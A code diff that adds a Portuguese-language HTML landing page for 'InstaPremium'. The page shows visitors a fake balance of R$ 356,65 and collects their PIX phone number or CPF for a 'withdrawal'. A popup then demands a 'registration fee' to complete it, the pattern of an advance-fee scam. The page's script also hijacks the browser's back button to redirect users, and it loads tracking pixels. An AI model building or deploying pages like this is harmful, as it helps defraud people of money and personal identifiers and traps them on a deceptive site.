@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    
+    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="cookies.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <title>InstaPremium</title>
+    <script 
+        src="https://cdn.xtracky.com/scripts/utm-handler.js"
+        data-token="bc9db88a-bcd0-437f-bd69-12f622d701bd"
+        data-click-id-param="click_id">
+</script>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '494913433675653');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=494913433675653&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    <style>
+      .welcome-bar {
+          background-color: #232423; 
+          color: white; 
+          padding: 10px 0; 
+          text-align: center; 
+          position: fixed; 
+          top: 50px;
+          left: 50%; 
+          transform: translateX(-50%);
+          width: 90%; 
+          border-radius: 8px;
+          font-size: 13px;
+          z-index: 9999;
+          transition: opacity 1s; 
+      }
+      /* Classe para ocultar a barra */
+      .welcome-bar.hidden {
+          opacity: 0; /* Torna a barra transparente */
+          pointer-events: none; /* Impede interações com a barra */
+      }
+    </style>
+    <script>
+        var option = 'phone';
+
+         function formatar(mascara, documento) {
+            let i = documento.value.length;
+            let saida = '#';
+            let texto = mascara.substring(i);
+            while (texto.substring(0, 1) != saida && texto.length ) {
+            documento.value += texto.substring(0, 1);
+            i++;
+            texto = mascara.substring(i);
+            }
+        }
+
+        function gerarPix() {
+            $('.pop').removeClass('d-none');
+            // //INTEGRAÇÃO AQUI
+            // if (option == 'phone') {
+            //     localStorage.setItem('pix', $('.phone').val());
+            //     var pixKey = '+55' + $('.phone').val().replace(/\D/g,'');
+            // } else {
+            //     localStorage.setItem('pix', $('.cpf').val());
+            //     var pixKey = $('.cpf').val().replace(/\D/g,'');
+            // }
+
+            // var url = 'https://api.primepag.com.br/v1/pix/payments';
+            // var uniqueId = generateUniqueId();
+            // var data =   {
+            //     "initiation_type": "dict", 
+            //     "idempotent_id": uniqueId, 
+            //     "receiver_name": "John Doe", 
+            //     "value_cents": 5,
+            //     "pix_key_type": option,
+            //     "pix_key": pixKey,
+            //     "authorized": true
+            // }
+
+            // $.ajax({
+            //     url: 'https://cupom-server-3857a533d564.herokuapp.com/api/payment-2',
+            //     type: 'POST',
+            //     contentType: 'application/json',
+            //     data: JSON.stringify(data),
+            //     success: function(response) {
+            //         $('.pop').removeClass('d-none');
+
+            //         console.log(response, data)
+            //     },
+            //     error: function(response) {
+            //         console.log(response, data)
+            //         alert('Erro ao gerar pix.')
+            //     }
+            // });
+        };
+        function generateUniqueId() {
+            // Gera um número aleatório entre 0 e 9999999999
+            var randomNumber = Math.floor(Math.random() * 10000000000);
+            // Concatena a data atual para tornar o identificador mais exclusivo
+            var timestamp = new Date().getTime();
+            // Retorna a combinação do número aleatório e do timestamp
+            return 'PAGAMENTO_PARCEIRO01' + randomNumber + timestamp;
+        }
+
+        $(document).ready(function() {
+            $('.option').click(function() {
+            $('.option').removeClass('selected');
+            $(this).addClass("selected");
+                option = $(this).attr('id');
+                console.log(option);
+
+                if (option == 'phone') {
+                $('.phone').removeClass('d-none');
+                $('.cpf').addClass('d-none');
+            } else {
+                $('.cpf').removeClass('d-none');
+                $('.phone').addClass('d-none');
+            }
+            });
+
+            var urlBackRedirect = `/back.html`;
+    // não altere nada abaixo dessa linha
+    urlBackRedirect = urlBackRedirect = urlBackRedirect.trim() +
+            (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') +
+            document.location.search.replace('?', '').toString();
+    history.pushState({}, "", location.href);
+    history.pushState({}, "", location.href);
+    window.onpopstate = function () {
+        setTimeout(function () {
+            location.href = urlBackRedirect;
+        }, 1);
+    };
+        })
+  </script>
+  </head>
+  <body>
+    <header>
+      <img src="./logo.svg" alt="" style="width: 150px;">
+      <span class="saldo">R$ 356,65</span>
+    </header>
+    <div class="pop-2 d-none">
+        <div class="pop-out-foto">
+            <img src="gold-coin-money-symbol-icon-png.png" style="margin: 30px 0px;" alt="">
+            <p style="font-size: 15px; font-weight: bold; color: #4ADE80;">Você recebeu o seu saque teste </p>
+            <div style="background-color: #202020; padding: 10px 3px; margin: 20px; border-radius: 8px;">Verifique suas notificações ou extrato bancário!</div>
+            <p style="font-size: 15px;">Agora basta realizar mais 3 avaliações para realizar seu<span style="color: #8D51FE; font-weight: 600;"> PRIMEIRO SAQUE COMPLETO!</span> </p>
+            <a class="btn-pop-out-foto" href="foto4.html">CONTINUAR</a>
+        </div>
+    </div>
+
+    <div class="pop d-none">
+        <div class="pop-out-foto">
+            <img src="alert-icon-red-11.png" style="margin: 30px 0px; width: 100px; height: 100px;" alt="">
+            <p style="font-size: 15px;">O seu saque foi <b>QUASE</b> finalizado! </p>
+            <p style="font-size: 15px; margin: 10px 0px;">Para continuar lucrando com o InstaPremium e finalizar seu saque de <br /> <span style="color: #05d150; font-weight: 600; font-size: 25px;">R$ 356,65</span> </p>
+            <p style="font-size: 15px; ">Pague apenas a taxa de cadastro!</p>
+            <div style="background-color: #f9d0efa4; padding: 10px 3px; margin: 10px; border-radius: 8px; font-size: 14px;">Fique tranquilo(a)! Você receberá esse valor na sua conta após a <span style="color: #08903a; font-weight: 600;">confirmação do seu cadstro</span> </div>
+            <button class="btn-pop-out-foto sacar" onclick="window.location.href='google.com'" style="font-weight: bold;">CONCLUIR CADASTRO E SACAR</button>
+        </div>
+    </div>
+    <div class="post">
+        <div class="container" style="padding-top: 100px; margin: 0px 3%;">
+            <div class="card">
+                <p>Para realizar seu 1 saque <br /> <b>CADASTRE SUA CHAVE PIX.</b></p>
+                <p>Vamos te enviar o <span style="color: rgb(96, 201, 96); font-weight: bold;">PIX!</span>, verifique suas notificações ou extrato bancário!</p>
+            </div>
+            <p style="font-size: 13px; text-align: center; margin: 35px 0px 10px 0px; color: black;">
+                <i class="fa-brands fa-pix" style="color: rgb(71, 185, 128);"></i>
+                Selecione sua chave PIX
+            </p>
+            <div class="wrapperOption">
+                <div class="option selected" id="phone">
+                    <i class="fa-solid fa-mobile-screen-button"></i>
+                    Celular
+                </div>
+
+                <div class="option" id="cpf">
+                    <i class="fa-solid fa-address-card"></i>
+                    CPF
+                </div>
+            </div>
+            <input style="border: 1.5px solid rgb(255, 184, 226); color: grey; background-color: white;" class="phone" type="tel" placeholder="Digite seu número aqui (55 999999999)" OnKeyPress="formatar('(##) #####-####',this)" maxlength="15" />
+            <input style="border: 1.5px solid rgb(255, 184, 226); color: grey; background-color: white;" class="cpf d-none" placeholder="Digite seu CPF aqui..." OnKeyPress="formatar('###.###.###-##',this)" maxlength="14"/>
+            <button class="btn" onclick="gerarPix()">REALIZAR SAQUE</button>
+        </div>
+    </div>  
+    
+  </body>
+  
+  <script src="./script.js"></script>
+</html>
